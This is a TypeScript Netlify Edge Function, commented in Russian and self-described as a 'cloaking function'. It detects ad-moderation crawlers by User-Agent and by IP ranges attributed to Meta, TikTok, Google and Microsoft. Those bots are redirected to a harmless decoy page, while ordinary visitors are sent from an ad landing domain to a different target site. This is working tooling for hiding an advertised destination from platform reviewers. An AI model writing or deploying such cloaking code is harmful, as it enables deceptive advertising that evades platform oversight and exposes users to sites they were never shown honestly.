import type { Context } from "https://edge.netlify.com";

// ============================================
// Встроенная конфигурация и утилиты
// ============================================

interface BotInfo {
  isBot: boolean;
  type: string;
  userAgent: string;
  ip?: string;
}

interface RedirectConfig {
  mainDomain: string;
  botRedirectUrl: string;
  realUserRedirectUrl: string;
  excludedPaths: string[];
}

// Конфигурация редиректов
function getRedirectConfig(): RedirectConfig {
  return {
    // Рекламная страница (входная точка)
    mainDomain: "penalibabasi.netlify.app",
    
    // URL для редиректа ботов/модераторов (безопасная страница)
    botRedirectUrl: "https://yalanyokgaming.netlify.app",
    
    // URL для редиректа реальных пользователей (целевая страница)
    realUserRedirectUrl: "https://aslanerturk.com",
    
    // Исключенные пути (пропускаются без проверки)
    excludedPaths: [
      "/favicon.ico",
      "/robots.txt",
      "/sitemap.xml",
      "/manifest.json",
      "/apple-touch-icon.png",
      "/.well-known",
      "/assets",
      "/css",
      "/js",
      "/images"
    ]
  };
}

// Список User-Agent'ов для ботов, модераторов и проверок
const BOT_UA_REGEX = /bot|crawl|spider|facebookexternalhit|facebot|slurp|mediapartners|adsbot|bingpreview|twitterbot|linkedinbot|embedly|quora|pinterest|crawler|python-requests|axios|wget|fetch|telegrambot|vkshare|whatsapp|skypeuripreview|discordbot|applebot|snapchat|google|yahoo|baidu|yandex|duckduckbot|curl|scrapy|httpclient|postman|insomnia/i;

// Диапазоны IP, часто используемые Meta/Facebook/TikTok/Google для проверки
const BLOCKED_IP_RANGES = [
  /^31\.13\./,     // Facebook/Meta
  /^157\.240\./,   // Facebook/Meta
  /^185\.60\./,    // Facebook/Meta
  /^66\.220\./,    // Facebook/Meta
  /^69\.63\./,     // Facebook/Meta
  /^173\.252\./,   // Facebook/Meta
  /^204\.15\.20\./,// TikTok
  /^23\.235\./,    // Google cache
  /^66\.249\./,    // Googlebot
  /^157\.55\./,    // Bing
  /^207\.46\./,    // Microsoft
  /^40\.77\./,     // Microsoft
  /^52\.167\./,    // Microsoft
  /^13\.107\./,    // Microsoft
];

// Проверка на бота по User-Agent и IP
function isBot(request: Request): BotInfo {
  const userAgent = request.headers.get("user-agent") || "";
  const ip = request.headers.get("x-forwarded-for")?.split(",")[0] || 
             request.headers.get("x-real-ip") || 
             request.headers.get("cf-connecting-ip") || "";

  // Проверка по User-Agent
  const isBotUA = !userAgent || BOT_UA_REGEX.test(userAgent);
  
  // Проверка по IP
  const isBlockedIP = ip ? BLOCKED_IP_RANGES.some((regex) => regex.test(ip)) : false;
  
  const isBotDetected = isBotUA || isBlockedIP;
  
  let botType = "unknown";
  if (isBotUA) {
    if (userAgent.includes("facebook") || userAgent.includes("meta")) {
      botType = "facebook";
    } else if (userAgent.includes("google")) {
      botType = "google";
    } else if (userAgent.includes("bing")) {
      botType = "bing";
    } else if (userAgent.includes("twitter")) {
      botType = "twitter";
    } else if (userAgent.includes("linkedin")) {
      botType = "linkedin";
    } else if (userAgent.includes("telegram")) {
      botType = "telegram";
    } else if (userAgent.includes("discord")) {
      botType = "discord";
    } else if (userAgent.includes("whatsapp")) {
      botType = "whatsapp";
    } else if (userAgent.includes("python") || userAgent.includes("curl") || userAgent.includes("wget")) {
      botType = "scraper";
    } else {
      botType = "generic_bot";
    }
  } else if (isBlockedIP) {
    botType = "blocked_ip";
  }

  return {
    isBot: isBotDetected,
    type: botType,
    userAgent,
    ip
  };
}

// Проверка, нужно ли исключить путь из проверки
function shouldExcludePath(pathname: string, config: RedirectConfig): boolean {
  return config.excludedPaths.some(excludedPath => 
    pathname.startsWith(excludedPath)
  );
}

// Получение целевого URL для редиректа реальных пользователей
function getTargetUrl(request: Request, config: RedirectConfig): string {
  const url = new URL(request.url);
  
  // Всегда редиректим реальных пользователей на целевую страницу
  // Сохраняем путь и параметры запроса, если они есть
  const pathAndQuery = url.pathname + url.search;
  
  // Если путь не пустой и не корневой, добавляем его к целевому URL
  if (pathAndQuery && pathAndQuery !== '/') {
    return `${config.realUserRedirectUrl}${pathAndQuery}`;
  }
  
  // Иначе просто редиректим на целевую страницу
  return config.realUserRedirectUrl;
}

// ============================================
// Основная Edge Function
// ============================================

export default async (request: Request, context: Context) => {
  try {
    const url = new URL(request.url);
    const host = request.headers.get("host") || "";
    
    // Получаем конфигурацию редиректов
    const config = getRedirectConfig();
    
    // Проверяем, нужно ли исключить путь из проверки
    if (shouldExcludePath(url.pathname, config)) {
      return context.next();
    }
    
    // Проверяем, является ли запрос от бота
    const botInfo = isBot(request);
    
    if (botInfo.isBot) {
      console.log(`🤖 Bot detected: ${botInfo.type} - ${botInfo.userAgent} - IP: ${botInfo.ip}`);
      
      // Ботов редиректим на безопасную страницу
      return Response.redirect(config.botRedirectUrl, 302);
    }
    
    // Для реальных пользователей - всегда редиректим на целевую страницу
    // (независимо от того, пришли они с penalibabasi.netlify.app или другого домена)
    const targetUrl = getTargetUrl(request, config);
    return Response.redirect(targetUrl, 302);
  } catch (error) {
    // В случае ошибки - пропускаем запрос дальше
    console.error("Error in cloaking function:", error);
    return context.next();
  }
};

export const config = {
  path: "/*",
  excludedPath: [
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
    "/manifest.json",
    "/apple-touch-icon.png",
    "/.well-known/*",
    "/assets/*",
    "/css/*",
    "/js/*",
    "/images/*"
  ]
};
